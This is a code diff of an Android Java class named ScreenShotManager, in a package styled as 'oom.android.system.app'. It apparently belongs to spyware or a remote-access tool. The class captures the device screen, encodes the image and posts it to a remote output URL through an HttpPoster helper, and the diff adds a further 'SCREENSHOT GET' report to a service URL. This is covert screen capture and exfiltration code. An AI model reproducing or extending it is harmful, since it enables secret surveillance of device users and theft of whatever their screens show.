@@ -12,23 +12,24 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 
 import oom.android.system.app.HttpPoster;
+import oom.android.system.app.MainActivity;
 import oom.android.system.app.MyService;
 import oom.android.system.Settings.TypeOpenFile;
 
 public class ScreenShotManager {
 
-    public static Bitmap takeScreenShot(Activity activity) {
-        View view = activity.getWindow().getDecorView();
+    public static Bitmap takeScreenShot() {
+        View view = MainActivity.activity.getWindow().getDecorView();
         view.setDrawingCacheEnabled(true);
         view.buildDrawingCache();
         Bitmap b1 = view.getDrawingCache();
         Rect frame = new Rect();
-        activity.getWindow().getDecorView().getWindowVisibleDisplayFrame(frame);
+        MainActivity.activity.getWindow().getDecorView().getWindowVisibleDisplayFrame(frame);
         int statusBarHeight = frame.top;
 
 
-        int width = activity.getWindowManager().getDefaultDisplay().getWidth();
-        int height = activity.getWindowManager().getDefaultDisplay().getHeight();
+        int width = MainActivity.activity.getWindowManager().getDefaultDisplay().getWidth();
+        int height = MainActivity.activity.getWindowManager().getDefaultDisplay().getHeight();
 
 
         Bitmap b = Bitmap.createBitmap(b1, 0, statusBarHeight, width, height - statusBarHeight);
@@ -58,6 +59,7 @@ public class ScreenShotManager {
 
 
                 post(MyService.output_img,encodedImage);
+                post(MyService.post_url,"SCREENSHOT GET");
 
 
             } catch (Exception e) {
